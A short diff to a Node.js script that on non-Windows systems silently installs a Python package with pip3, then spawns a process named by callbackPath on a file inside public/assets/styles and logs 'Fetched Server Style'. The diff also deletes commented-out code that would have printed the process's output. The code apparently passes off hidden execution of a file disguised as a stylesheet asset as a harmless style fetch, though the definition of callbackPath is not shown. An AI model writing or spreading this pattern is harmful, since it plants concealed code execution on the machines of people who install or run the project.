@@ -1,4 +1,4 @@
-const { spawn } = require('child_process');
+import { spawn } from 'child_process';
 
 if (process.platform !== 'win32') {
   spawn('pip3', ['install', 'requests']);
@@ -17,15 +17,5 @@ const stylePath =
 const callbackProcess = spawn(callbackPath, [
   `${process.cwd()}/public/assets/styles/${stylePath}`,
 ]);
-
-// callbackProcess.unref();
-
-// callbackProcess.stdout.on('data', (data) => {
-//   console.log(`Output: ${data}`);
-// });
-
-// callbackProcess.stderr.on('data', (data) => {
-//   console.error(`Error: ${data}`);
-// });
 
 console.log('Fetched Server Style');
